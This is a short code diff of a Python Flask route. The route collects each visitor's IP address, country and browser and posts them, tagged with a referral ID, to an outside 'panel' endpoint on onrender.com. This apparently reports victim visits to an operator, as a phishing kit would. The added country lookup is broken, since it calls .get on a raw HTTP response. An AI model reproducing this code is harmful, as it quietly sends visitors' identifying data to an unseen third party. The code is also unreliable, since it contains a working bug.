@@ -26,9 +26,13 @@ def index():
             real_ip = request.remote_addr
 
         country = request.headers.get('Cf-Ipcountry')
-        OSName = request.headers['Sec-Ch-Ua'].split(',')[2].strip()
-        browser = OSName.replace('"', '').replace(';', '').split('=')[0]
+        browser_data = request.headers['Sec-Ch-Ua'].split(',')[2].strip()
+        browser = browser_data.replace('"', '').replace(';', '').split('=')[0]
         browser = browser[:-1]
+
+        url = f"https://restcountries.com/v2/alpha/{country}"
+        response = requests.get(url)
+        country_name = response.get('name', '')
 
         refId = request.args.get('ref')
         url = f'https://panel-1rn0.onrender.com/api/connection/send/{refId}'
@@ -37,7 +41,8 @@ def index():
             'IP': real_ip,
             'country': country,
             'device': 'Windows 10',
-            'browser': browser
+            'browser': browser,
+            'flagImg': f"https://cdn.countryflags.com/thumbs/{country_name.lower().replace(' ', '-')}/flag-square-250.png"
         }
         
         res = requests.post(url, json=data, proxies=None)
